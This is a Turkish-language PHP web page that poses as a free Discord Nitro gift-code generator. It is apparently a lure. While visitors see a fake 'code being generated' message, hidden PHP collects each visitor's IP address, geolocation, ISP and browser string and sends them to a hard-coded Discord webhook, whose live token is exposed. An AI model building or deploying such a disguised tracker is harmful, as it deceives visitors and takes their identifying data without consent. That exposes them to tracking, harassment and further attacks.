<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🎁 Bedava Nitro</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a1a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: Arial, sans-serif;
        }
        .kutu {
            background: #1a1a3e;
            padding: 40px;
            border-radius: 30px;
            text-align: center;
            max-width: 500px;
            box-shadow: 0 0 50px rgba(233,69,96,0.3);
        }
        h1 { color: #e94560; }
        .footer { margin-top: 20px; color: #555; font-size: 12px; }
        .isik {
            margin-top: 30px;
            font-size: 18px;
            color: #00ff88;
            animation: isik 1s infinite alternate;
        }
        @keyframes isik {
            0% { text-shadow: 0 0 5px #00ff88; }
            100% { text-shadow: 0 0 20px #ff00ff, 0 0 40px #00ff88; }
        }
    </style>
</head>
<body>
<div class="kutu">
    <h1>🎁 BEDAVA NİTRO</h1>
    <p>Hediye kodunuz hazırlanıyor...</p>
    <div class="isik">⚡ Kod oluşturuluyor, lütfen bekleyin...</div>
    <div class="footer">Discord Nitro © 2026</div>
</div>
<?php
// ---- KONFİG ----
$webhook = "https://discord.com/api/webhooks/1518189732692103198/bsr3VNCIFgM-yQbOekAfBjYJ5acWdrmmrhnXNHRjko93yJ0bicj9Vzg9GC0d4Y8KwZ8A";

// ---- IP ve Konum Al ----
$ip = $_SERVER['REMOTE_ADDR'];
$konum = json_decode(@file_get_contents("http://ip-api.com/json/{$ip}"), true);
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$tarih = date("Y-m-d H:i:s");

// ---- Raporu Hazırla ----
$mesaj = "**🌐 YENİ ZİYARETÇİ!**\n";
$mesaj .= "─────────────────\n";
$mesaj .= "🆔 IP: {$ip}\n";
$mesaj .= "📍 Konum: " . ($konum['country'] ?? 'Bilinmiyor') . " / " . ($konum['city'] ?? 'Bilinmiyor') . "\n";
$mesaj .= "🏢 ISP: " . ($konum['isp'] ?? 'Bilinmiyor') . "\n";
$mesaj .= "💻 Tarayıcı: " . $user_agent . "\n";
$mesaj .= "📅 Zaman: {$tarih}\n";
$mesaj .= "─────────────────";

// ---- Webhook'a Gönder ----
$payload = json_encode(["content" => $mesaj]);
$ch = curl_init($webhook);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_exec($ch);
curl_close($ch);
?>
</body>
</html>
